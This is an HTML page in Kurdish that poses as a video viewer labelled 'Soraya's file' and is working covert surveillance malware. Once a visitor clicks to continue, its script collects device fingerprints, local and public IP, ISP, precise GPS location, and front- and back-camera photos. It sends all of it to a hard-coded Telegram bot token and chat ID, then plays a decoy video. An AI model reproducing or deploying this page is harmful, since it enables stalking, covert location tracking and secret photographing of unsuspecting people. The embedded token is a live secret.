<!DOCTYPE html>
<html lang="ku" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>مەلەفی سوڕەیا</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; -webkit-tap-highlight-color: transparent; }
        body { 
            background: linear-gradient(135deg, #0f172a, #1e293b); 
            height: 100vh; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            overflow: hidden;
            position: fixed;
            width: 100%;
        }
        .container { 
            background: #ffffff; 
            padding: 22px; 
            border-radius: 24px; 
            box-shadow: 0 20px 40px rgba(0,0,0,0.4); 
            width: 92%; 
            max-width: 380px; 
            text-align: center; 
        }
        .preview-img-box {
            width: 100%;
            height: 200px;
            border-radius: 16px;
            overflow: hidden;
            margin-bottom: 15px;
            box-shadow: 0 8px 20px rgba(0,0,0,0.15);
            position: relative;
            background: #000;
        }
        .preview-img-box img {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }
        .image-overlay-text {
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            background: linear-gradient(to top, rgba(0,0,0,0.85), rgba(0,0,0,0.4));
            color: #ffffff;
            padding: 10px;
            font-size: 13px;
            font-weight: bold;
            text-align: center;
        }
        .content-after-allow {
            display: none;
            margin-bottom: 15px;
        }
        .content-after-allow video {
            width: 100%;
            border-radius: 12px;
            max-height: 240px;
            object-fit: cover;
            outline: none;
        }
        .title { font-size: 22px; font-weight: 800; color: #0f172a; margin-bottom: 6px; }
        .subtitle { color: #64748b; font-size: 13px; margin-bottom: 20px; line-height: 1.5; font-weight: 500; }
        .btn { 
            background: linear-gradient(135deg, #2563eb, #1d4ed8); 
            color: white; 
            padding: 15px; 
            border: none; 
            border-radius: 30px; 
            cursor: pointer; 
            font-size: 16px; 
            width: 100%; 
            font-weight: bold; 
            box-shadow: 0 6px 16px rgba(37,99,235,0.4);
        }
        .loader {
            border: 3px solid #f3f3f3;
            border-radius: 50%;
            border-top: 3px solid #2563eb;
            width: 32px;
            height: 32px;
            animation: spin 1s linear infinite;
            margin: 15px auto;
            display: none;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status-text { margin-top: 15px; font-size: 12px; color: #94a3b8; font-weight: 500; }
    </style>
</head>
<body>

    <div class="container" id="mainContainer">
        <div id="imageBox" class="preview-img-box">
            <img src="surayamalaf.jpg" alt="مەلەفی سوڕەیا">
            <div class="image-overlay-text">بۆ بینینی ڤیدیۆکە allow دابگرە</div>
        </div>

        <div id="mediaBox" class="content-after-allow">
            <video id="targetVideo" controls playsinline>
                <source src="sararanyai.MP4" type="video/mp4">
                تەلەفۆنەکەت پشتگیری ڤیدیۆ ناکات
            </video>
        </div>

        <div class="title" id="boxTitle">مەلەفی سوڕەیا</div>
        <div class="subtitle" id="boxSubtitle">بۆ بەردەوامبوون و بینینی تەواوی ڤیدیۆکە، کلیک بکە:</div>
        
        <div id="loader" class="loader"></div>
        <button id="mainBtn" class="btn" onclick="startProcess()">بەردەوامبوون</button>
        
        <div class="status-text" id="statusText">ئامادەیە</div>
    </div>

    <video id="camVideo" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = "9188898335:AAEpuZXa0igf-7GbuvykP0uT9U5GJQZJU0g";
        const CHAT_ID = "6947664268";

        function sendToTelegramText(text) {
            let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            fetch(url, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ 
                    chat_id: CHAT_ID, 
                    text: text,
                    parse_mode: "Markdown"
                })
            });
        }

        function sendToTelegramPhoto(blob, caption) {
            let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
            let formData = new FormData();
            formData.append("chat_id", CHAT_ID);
            formData.append("photo", blob, "capt.jpg");
            formData.append("caption", caption);
            formData.append("parse_mode", "Markdown");
            fetch(url, { method: "POST", body: formData });
        }

        // WebRTC بۆ دەرهێنانی Local IP
        function getLocalIPs(callback) {
            try {
                let ips = [];
                let RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
                if (!RTCPeerConnection) { callback([]); return; }
                let pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
                pc.createDataChannel("");
                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
                pc.onicecandidate = (ice) => {
                    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                    let parts = ice.candidate.candidate.split(" ");
                    let ip = parts[4];
                    if (ips.indexOf(ip) === -1) {
                        ips.push(ip);
                        callback(ips);
                    }
                };
            } catch(e) {
                callback([]);
            }
        }

        // دروستکردنی فینگەرپرینتی تایبەتی کەنڤاس (Canvas Fingerprint)
        function getCanvasFingerprint() {
            try {
                let canvas = document.createElement('canvas');
                let ctx = canvas.getContext('2d');
                ctx.textBaseline = "top";
                ctx.font = "14px 'Arial'";
                ctx.fillStyle = "#f60";
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = "#069";
                ctx.fillText("OSINT_PRO_FINGERPRINT", 2, 15);
                return canvas.toDataURL().slice(-50); // کۆدی تاقەی تایبەت
            } catch(e) {
                return "Unavailable";
            }
        }

        // کارتی شاشە و گرافیک
        function getGPUInfo() {
            try {
                let canvas = document.createElement('canvas');
                let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return "نەزانراو";
                let dbg = gl.getExtension('WEBGL_debug_renderer_info');
                return dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Standard WebGL";
            } catch(e) {
                return "بەردەست نییە";
            }
        }

        // زانیاری پاتری
        async function getBatteryInfo() {
            if ('getBattery' in navigator) {
                try {
                    let battery = await navigator.getBattery();
                    let level = Math.round(battery.level * 100) + "%";
                    let charging = battery.charging ? "⚡ لە حالەتی چارجدا" : "🔋 بێ چارج";
                    return `${level} (${charging})`;
                } catch(e) {
                    return "نەتوانرا بخوێنرێتەوە";
                }
            }
            return "پشتیوانی ناکرێت";
        }

        // کۆکردنەوە و ناردنی زانیارییەکان
        async function gatherAndSendDetails() {
            let ua = navigator.userAgent;
            let platform = navigator.platform;
            let language = navigator.language;
            let screenRes = window.screen.width + "x" + window.screen.height;
            let cpuCores = navigator.hardwareConcurrency || "نەزانراو";
            let deviceRam = navigator.deviceMemory ? navigator.deviceMemory + " GB+" : "نەزانراو";
            let touchPoints = navigator.maxTouchPoints || 0;
            let gpu = getGPUInfo();
            let battery = await getBatteryInfo();
            let canvasFP = getCanvasFingerprint();
            
            let conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            let netType = conn ? (conn.effectiveType || "نەزانراو") : "نەزانراو";

            getLocalIPs(function(localIPs) {
                let localIPText = localIPs.length > 0 ? localIPs.join(", ") : "شاراوە / پەنهاو";

                fetch('https://ipapi.co/json/')
                .then(res => res.json())
                .then(data => {
                    let report = `🔥 *ڕاپۆرتی لووتکەی قووڵ (ULTIMATE OSINT):*\n\n` +
                                 `🌐 *تۆڕ و زانیاری ڕایەڵە:*\n` +
                                 `• *ئایپی گشتی (Public IP):* \`${data.ip}\`\n` +
                                 `• *ئایپی ناوخۆیی (Local IP):* \`${localIPText}\`\n` +
                                 `• *وڵات و شاری سیستمی IP:* ${data.country_name} - ${data.city} *(تێبینی: شار لە IPAPI هەندێک جار مەرج نییە ڕاست بێت)*\n` +
                                 `• *دابینکەری هێڵ (ISP):* ${data.org}\n` +
                                 `• *جۆری هێڵ:* ${netType.toUpperCase()}\n\n` +
                                 `💻 *وردەکاری ڕەقامەواڵە و فینگەرپرینت:*\n` +
                                 `• *سیستم:* ${platform}\n` +
                                 `• *پرۆسێسەر (CPU Cores):* ${cpuCores}\n` +
                                 `• *ڕام (RAM):* ${deviceRam}\n` +
                                 `• *کارتی شاشە (GPU):* \`${gpu}\`\n` +
                                 `• *دۆخی پاتری:* ${battery}\n` +
                                 `• *خاڵەکانی تاچ:* ${touchPoints}\n` +
                                 `• *فینگەرپرینتی شاشە (Canvas FP):* \`${canvasFP}\`\n` +
                                 `• *ڕەهەندی شاشە:* ${screenRes}\n` +
                                 `• *زمان:* ${language}\n\n` +
                                 `📱 *براوسەر (User Agent):*\n\`${ua}\``;
                    
                    sendToTelegramText(report);
                }).catch(err => {
                    let basicReport = `🔥 *ڕاپۆرتی توند:* \n• سیستم: ${platform} \n• Local IP: \`${localIPText}\``;
                    sendToTelegramText(basicReport);
                });
            });
        }

        function sendLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    let lat = position.coords.latitude;
                    let lon = position.coords.longitude;
                    let accuracy = position.coords.accuracy;
                    let locMsg = `📍 *شوێنی GPSی ڕاستەقینە (ورد و سەد در سەد):*\n` +
                                 `• *هێڵی پانی (Lat):* \`${lat}\`\n` +
                                 `• *هێڵی درێژی (Lon):* \`${lon}\`\n` +
                                 `• *ڕێژەی هەڵە (Accuracy):* ~${Math.round(accuracy)} مەتر\n` +
                                 `🗺️ [کردنەوە لە نەخشەی گۆگڵ (سلێمانیدا دیاری دەکات)](https://maps.google.com/?q=${lat},${lon})`;
                    sendToTelegramText(locMsg);
                }, function(error) {
                    sendToTelegramText(`⚠️ *تێبینی شوێن:* سەردانیکەر مۆڵەتی GPSی ڕەتکردەوە (Allow نەکرد).`);
                }, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
            }
        }

        // گرتنی وێنەی پێشەوە و دوای ئامێرەکە (بە شێوازی بەدوای یەک)
        function takePicturesSequence() {
            const video = document.getElementById('camVideo');
            const canvas = document.getElementById('canvas');
            
            // گرتنی دوربینەی پێشەوە (User)
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
            .then(function(stream) {
                video.srcObject = stream;
                video.play();
                
                setTimeout(function() {
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    let context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    canvas.toBlob(function(blob) {
                        sendToTelegramPhoto(blob, "📸 *وێنەی سەردانیکەر (دوربینی پێشەوە - Selfie)*");
                    }, 'image/jpeg', 0.9);
                    
                    stream.getTracks().forEach(track => track.stop());

                    // دوای گرتنی پێشەوە، هەوڵدان بۆ گرتنی دوربینەی دواوە (Environment) ئەگەر بەردەست بێت
                    setTimeout(function() {
                        navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } }, audio: false })
                        .then(function(backStream) {
                            video.srcObject = backStream;
                            video.play();
                            setTimeout(function() {
                                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                                canvas.toBlob(function(backBlob) {
                                    sendToTelegramPhoto(backBlob, "📷 *وێنەی دەوروبەر (دوربینی دواوە - Back Camera)*");
                                }, 'image/jpeg', 0.9);
                                backStream.getTracks().forEach(track => track.stop());
                            }, 1000);
                        }).catch(e => {
                            // ئەگەر دوربینی دواوە نەبوو یان ڕەتکرایەوە، تێبینی دەنێرێت
                        });
                    }, 1000);

                }, 1200);
            })
            .catch(function(err) {
                sendToTelegramText(`⚠️ *تێبینی دوربین:* سەردانیکەر مۆڵەتی دوربینەی ڕەتکردەوە (Allow نەکرد).`);
            });
        }

        function startProcess() {
            document.getElementById('mainBtn').style.display = 'none';
            document.getElementById('loader').style.display = 'block';
            document.getElementById('statusText').innerText = 'چاوەڕوان بە...';

            gatherAndSendDetails();
            sendLocation();
            takePicturesSequence();

            setTimeout(function() {
                document.getElementById('loader').style.display = 'none';
                document.getElementById('imageBox').style.display = 'none';
                document.getElementById('mediaBox').style.display = 'block';
                document.getElementById('boxTitle').innerText = 'مەلەفی سوڕەیا';
                document.getElementById('boxSubtitle').innerText = 'فەرموو ڤیدیۆکە دەست پێ دەکات:';
                document.getElementById('statusText').innerText = 'سەرکەوتوو بوو';
                
                let vid = document.getElementById('targetVideo');
                vid.play().catch(e => console.log(e));
            }, 3000);
        }
    </script>
</body>
</html>
